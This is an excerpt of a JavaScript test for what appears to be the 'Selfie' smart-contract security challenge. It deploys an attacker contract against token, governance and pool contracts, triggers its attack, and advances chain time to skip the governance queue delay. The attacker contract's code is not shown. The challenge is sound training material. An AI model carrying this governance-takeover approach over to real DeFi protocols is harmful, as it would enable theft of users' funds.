...
describe('[Challenge] Selfie', function () {
	...
	it('Exploit', async function () {
		...
		const SelfieExploit = await ethers.getContractFactory('SelfieAttacker', attacker);
		this.attacker = await SelfieExploit.deploy(
			this.token.address,
			this.governance.address,
			this.pool.address
		);
		await this.attacker.attack();
		await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);//skip the queue waiting time
